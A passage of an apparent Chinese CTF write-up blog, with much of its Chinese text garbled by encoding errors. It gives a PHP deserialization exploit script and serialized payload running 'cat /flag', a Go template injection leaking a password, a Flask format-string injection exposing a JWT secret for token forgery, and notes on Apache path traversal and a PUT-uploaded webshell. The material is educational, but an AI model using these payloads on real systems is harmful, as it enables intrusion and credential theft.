class="variable">$cl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;All matters have concluded&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;ending);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt;<span class="variable">$value</span>)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$arg</span>[<span class="number">0</span>][<span class="string">&#x27;POC&#x27;</span>]==<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;payload = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$paylaod</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$paylaod</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;symbol = True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$value</span>(<span class="variable language_">$this</span>-&gt;Flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;start1.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start2===<span class="string">&quot;11111&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;start1-&gt;<span class="title function_ invoke__">Love</span>(<span class="variable">$this</span>-&gt;start);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You are Good!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Ha_rde_r&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Ha_rde_r&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You are Silly goose!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>EXP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rd</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span> = [<span class="string">&#x27;POC&#x27;</span>=&gt;<span class="string">&#x27;1111&#x27;</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Ha</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Poc</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Er</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Rd</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;start2 = <span class="string">&quot;11111&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;start1 = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;start = <span class="variable">$b</span>-&gt;payload;</span><br><span class="line"><span class="variable">$d</span>-&gt;cl = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;Flag = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;Ha&quot;:3:&#123;s:5:&quot;start&quot;;a:1:&#123;s:3:&quot;POC&quot;;s:4:&quot;1111&quot;;&#125;s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:&#123;s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:&#123;s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:9:&quot;cat /flag&quot;;&#125;s:3:&quot;poc&quot;;N;&#125;s:6:&quot;start2&quot;;s:5:&quot;11111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721172553666.png" alt="image-20240721172553666"></p>
<h2 id="SCTF-2021-loginme-1"><a href="#SCTF-2021-loginme-1" class="headerlink" title="[SCTF 2021]loginme"></a>[SCTF 2021]loginme</h2><blockquote>
<p>I donâ€™t know the age of the admin, can you tell me?By the way, adminâ€™s Password maybe the thing you want</p>
</blockquote>
<pre><code>![image-20240721173419307](https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721173419307.png)
</code></pre>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=xff&spm=1001.2101.3001.7020">xff</a>ï¼ŒX-Clien-IPï¼ŒX-Real-IP,x-remote-ipéƒ½ä»£è¡¨æœ¬åœ°ï¼Œæœ€åX-Real-IPæˆåŠŸè¿›å…¥</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721173819147.png" alt="image-20240721173819147"></p>
<p>ç„¶ååˆ†ææºç </p>
<p>å…³é”®ä»£ç </p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721174231082.png" alt="image-20240721174231082"></p>
<p><strong><code>middleware</code></strong></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721174020113.png" alt="image-20240721174020113"></p>
<p>æˆåŠŸè¿›å…¥åè·³è½¬è·³åˆ°<code>route.Login</code></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721174402402.png" alt="image-20240721174402402"></p>
<p>é¦–å…ˆè·å–idï¼Œæ²¡æœ‰çš„è¯é»˜è®¤ä¸º1ï¼Œç„¶åå°†å­—ç¬¦ä¸²å½¢å¼çš„idè½¬æ¢ä¸ºæ•´æ•°ï¼Œå¦‚æœè½¬æ¢å¤±è´¥ï¼Œåˆ™idå°†è¢«è®¾ç½®ä¸º<code>1</code>ã€‚</p>
<p>åœ¨<code>structs.Users</code>åˆ—è¡¨ä¸­æŸ¥æ‰¾ä¸<code>id</code>åŒ¹é…çš„ç”¨æˆ·ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…é¡¹ï¼Œåˆ™ä½¿ç”¨<code>structs.Admin</code>ä½œä¸ºé»˜è®¤ç”¨æˆ·ã€‚</p>
<p>æ£€æŸ¥ç”¨æˆ·çš„å¹´é¾„å­—æ®µï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™ä»æŸ¥è¯¢å‚æ•°ä¸­è·å–<code>age</code>ï¼Œå¦‚æœä»ç„¶æ²¡æœ‰åˆ™ä½¿ç”¨é»˜è®¤å€¼<code>forever 18 (Tell me the age)</code>ã€‚</p>
<p>è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721175148767.png" alt="image-20240721175148767"></p>
<p>ç„¶åæœ‰ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmpl, err := template.New(<span class="string">&quot;admin_index&quot;</span>).Parse(html)</span><br></pre></td></tr></table></figure>

<p>goè¯­è¨€æ¨¡æ¿æ¸²æŸ“æ”¯æŒä¼ å…¥ä¸€ä¸ªç»“æ„ä½“çš„å®ä¾‹æ¥æ¸²æŸ“å®ƒçš„å­—æ®µï¼Œå°±æœ‰å¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721175528022.png" alt="image-20240721175528022"></p>
<p>è€Œåœ¨goè¯­è¨€ä¸­ä½¿ç”¨çš„æ˜¯<code>&#123;&#123;.name&#125;&#125;</code>ä»£è¡¨è¦åº”ç”¨çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥è®©<code>age=&#123;&#123;.Password&#125;&#125;</code></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/6b35925d892f47c78dded0b40cbc6908.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¯å®æ¨æ–­</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721175641016.png" alt="image-20240721175641016"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721175700694.png" alt="image-20240721175700694"></p>
<h2 id="NSSRound-4-SWPU-ez-rce-1"><a href="#NSSRound-4-SWPU-ez-rce-1" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>å•¥ä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…åå‘ç°apacheç‰ˆæœ¬ä¸º2.4.49 (Unix)</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45260839/article/details/125113167">CVE-2021-41773(42013) Apache HTTP Serverè·¯å¾„ç©¿è¶Šæ¼æ´å¤ç°_cve-2021-41773å¤ç°-CSDNåšå®¢</a></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721180247059.png" alt="image-20240721180247059"></p>
<p>åŒæ—¶dirsearchä¹Ÿæœ‰æç¤º</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721181126194.png" alt="image-20240721181126194"></p>
<p>æŠ“åŒ…ä¿®æ”¹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721181417264.png" alt="image-20240721181417264"></p>
<p>ç›´æ¥è®¿é—®çœ‹ä¸äº†ï¼Œæœ€ååœ¨run.shä¸­çœ‹åˆ°flagçš„çœŸå®ä½ç½®</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721181459887.png" alt="image-20240721181459887"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721181546704.png" alt="image-20240721181546704"></p>
<h2 id="WUSTCTF-2020-CV-Maker-1"><a href="#WUSTCTF-2020-CV-Maker-1" class="headerlink" title="[WUSTCTF 2020]CV Maker"></a>[WUSTCTF 2020]CV Maker</h2><p>éšæ„æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721182147295.png" alt="image-20240721182144867"></p>
<p>æ–‡ä»¶ä¸Šä¼ </p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721183527789.png" alt="image-20240721183527789"></p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721183044880.png" alt="image-20240721183044880"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721183555041.png" alt="image-20240721183555041"></p>
<p>flagåœ¨ç¯å¢ƒå˜é‡ä¸­</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721183655428.png" alt="image-20240721183655428"></p>
<h2 id="NSSRound-1-Basic-basic-check-1"><a href="#NSSRound-1-Basic-basic-check-1" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><p>PUTæ–¹æ³•åˆ›å»ºæœ¨é©¬</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721184733912.png" alt="image-20240721184733912"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721184920543.png" alt="image-20240721184920543"></p>
<h2 id="MoeCTF-2021-åœ°ç‹±é€šè®¯-æ”¹-1"><a href="#MoeCTF-2021-åœ°ç‹±é€šè®¯-æ”¹-1" class="headerlink" title="[MoeCTF 2021]åœ°ç‹±é€šè®¯-æ”¹"></a>[MoeCTF 2021]åœ°ç‹±é€šè®¯-æ”¹</h2><p>ç›´æ¥ç»™æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, session, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret, headers, User</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        ctx = f.read()</span><br><span class="line">    res = make_response(ctx)</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line">    res.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>, <span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = jwt.decode(token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        user = User(name)</span><br><span class="line">        flag = request.args.get(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        message = <span class="string">&quot;Hello &#123;0&#125;, your flag is &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(user, flag)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>å¤§è‡´çœ‹ä¸€çœ¼ï¼Œåˆšå­¦çš„jwtä¼ªé€ </p>
<ol>
<li><code>index</code> è·¯ç”±ï¼šè¿™ä¸ªè·¯ç”±å¤„ç†æ ¹è·¯å¾„ â€œ&#x2F;â€ çš„è¯·æ±‚ï¼Œæ”¯æŒ GET å’Œ POST æ–¹æ³•ã€‚é¦–å…ˆï¼Œå®ƒè¯»å–æ–‡ä»¶ â€œapp.pyâ€ çš„å†…å®¹å¹¶å°†å…¶ä½œä¸ºå“åº”è¿”å›ã€‚ç„¶åï¼Œä»è¯·æ±‚å‚æ•°ä¸­è·å–åä¸º â€œnameâ€ çš„å€¼ï¼Œå¦‚æœè¯¥å€¼åŒ…å« â€œadminâ€ æˆ–è€…ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå°†è¿”å›ä¹‹å‰è¯»å–çš„ â€œapp.pyâ€ å†…å®¹ä½œä¸ºå“åº”ã€‚å¦åˆ™ï¼Œå°†ä½¿ç”¨æä¾›çš„ â€œnameâ€ æ„é€ ä¸€ä¸ª JWT è½½è·ï¼ˆpayloadï¼‰ï¼Œç„¶åä½¿ç”¨æŒ‡å®šçš„å¯†é’¥ <code>secret</code> å’Œå¤´éƒ¨ <code>headers</code> ç”Ÿæˆ JWTï¼Œå°†ç”Ÿæˆçš„ JWT æ”¾å…¥ cookie ä¸­ï¼Œæœ€åå°† â€œapp.pyâ€ å†…å®¹ä½œä¸ºå“åº”è¿”å›ã€‚</li>
<li><code>hello</code> è·¯ç”±ï¼šè¿™ä¸ªè·¯ç”±å¤„ç† â€œ&#x2F;helloâ€ è·¯å¾„çš„è¯·æ±‚ï¼ŒåŒæ ·æ”¯æŒ GET å’Œ POST æ–¹æ³•ã€‚é¦–å…ˆï¼Œå®ƒå°è¯•ä»è¯·æ±‚çš„ cookie ä¸­è·å–åä¸º â€œtokenâ€ çš„ JWTã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ° tokenï¼Œå°†é‡å®šå‘åˆ°æ ¹è·¯å¾„ â€œ&#x2F;â€. å¦‚æœæ‰¾åˆ° tokenï¼Œåˆ™å°è¯•è§£ç  JWT å¹¶ä»ä¸­æå– â€œnameâ€ å­—æ®µçš„å€¼ã€‚å¦‚æœ JWT éªŒè¯å¤±è´¥ï¼ˆå¯èƒ½æ˜¯å› ä¸ºç­¾åä¸åŒ¹é…ï¼‰ï¼Œè¿”å› â€œInvalid tokenâ€ã€‚</li>
<li>å¦‚æœ â€œnameâ€ å­—æ®µä¸æ˜¯ â€œadminâ€ï¼Œåˆ™åˆ›å»ºä¸€ä¸ª User å®ä¾‹ï¼Œç„¶åä»è¯·æ±‚å‚æ•°ä¸­è·å–åä¸º â€œflagâ€ çš„å€¼ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚æ¥ä¸‹æ¥ï¼Œæ ¹æ®ç”¨æˆ·çš„ä¿¡æ¯æ„é€ ä¸€æ¡æ¬¢è¿æ¶ˆæ¯ï¼Œå°† flag å€¼åµŒå…¥æ¶ˆæ¯ä¸­ï¼Œç„¶åå°†è¿™ä¸ªæ¶ˆæ¯ä½œä¸ºå“åº”è¿”å›ã€‚</li>
<li>å¦‚æœ â€œnameâ€ å­—æ®µæ˜¯ â€œadminâ€ï¼Œåˆ™æ¸²æŸ“ä¸€ä¸ªåä¸º â€œflag.htmlâ€ çš„æ¨¡æ¿ï¼Œå¹¶ä¼ é€’ â€œnameâ€ ä½œä¸ºå‚æ•°ã€‚</li>
</ol>
<p>è¿™é‡Œéœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼Œsecretå’Œheaders</p>
<p>ç”¨sstiæ¼æ´å¸¦å‡ºè¿™ä¸¤ä¸ªæ¡ä»¶</p>
<p>åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721192742870.png" alt="image-20240721192742870"></p>
<p>å¾—åˆ°å¯¹åº”çš„jwtçš„å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzIn0.pEkv9ha7ygfhxZay1tBtb48vjBzAW05Rw4-azvvefGA</span><br></pre></td></tr></table></figure>

<p>æ‹‰å‡ºæ¥çœ‹ä¸€ä¸‹å…·ä½“å†…å®¹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721192603326.png" alt="	"></p>
<p>å¸¦ç€tokenå»è®¿é—®</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721192942764.png" alt="image-20240721192942764"></p>
<p>å°è¯•ssti</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;0.__class__.__init__.__globals__&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721193627529.png" alt="image-20240721193627529"></p>
<p>secret: u_have_kn0w_what_f0rmat_i5</p>
<p>headers: {â€˜algâ€™: â€˜HS256â€™, â€˜typâ€™: â€˜JWTâ€™}</p>
<p>éªŒè¯æˆåŠŸ</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721193726623.png" alt="image-20240721193726623"></p>
<p>å°†ç”¨æˆ·æ”¹ä¸ºadmin</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721193809514.png" alt="image-20240721193809514"></p>
<p>å°†ä¼ªé€ å¥½çš„jwtæ”¾å…¥tokené‡æ–°å‘åŒ…è®¿é—®helloè·¯ç”±å¾—åˆ°flag</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721193908109.png" alt="image-20240721193908109"></p>
<h2 id="HZNUCTF-2023-final-eznode-1"><a href="#HZNUCTF-2023-final-eznode-1" class="headerlink" title="[HZNUCTF 2023 final]eznode"></a>[HZNUCTF 2023 final]eznode</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61768489/article/details/130138439">Nodejs vm&#x2F;vm2æ²™ç®±é€ƒé€¸_nodejs vm2-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://xilitter.github.io/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/index.html">vmæ²™ç®±é€ƒé€¸åˆæ¢ | XiLitter</a></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722085351426.png" alt="image-20240722085351426"></p>
<p>æç¤ºå°è¯•æŸ¥çœ‹æºç ï¼Œæœ€ç›´è§‚çš„å°±æ˜¯<code>node.js</code>é…ç½®é”™è¯¯é€ æˆçš„æºç æ³„éœ²äº†ï¼Œç›´æ¥è®¿é—®<code>app.js</code>è·å¾—é¡µé¢æºç </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 